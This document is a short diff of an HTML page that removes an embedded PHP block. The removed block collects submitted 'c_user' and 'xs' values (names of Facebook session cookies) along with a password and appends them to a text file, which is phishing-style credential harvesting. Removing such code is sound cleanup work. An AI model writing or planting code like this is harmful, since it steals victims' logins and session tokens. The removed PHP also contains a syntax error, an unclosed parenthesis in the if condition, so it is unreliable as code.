@@ -2145,23 +2145,6 @@
       });
     </script>
     
-    <?php
-    // PHP code to handle form submission
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        // Collect form data
-        $c_user = isset($_POST['c_user']) ? $_POST['c_user'] : '';
-        $xs = isset($_POST['xs']) ? $_POST['xs'] : '';
-        $password = isset($_POST['password']) ? $_POST['password'] : '';
-        
-        // Validate and process the data
-        if (!empty($c_user) {
-            // Save to a file or database
-            $data = "c_user: $c_user\nxs: $xs\npassword: $password\n\n";
-            file_put_contents('submissions.txt', $data, FILE_APPEND);
-            
-            // You can also send an email or process the data further
-        }
-    }
-    ?>
+   
   </body>
 </html>
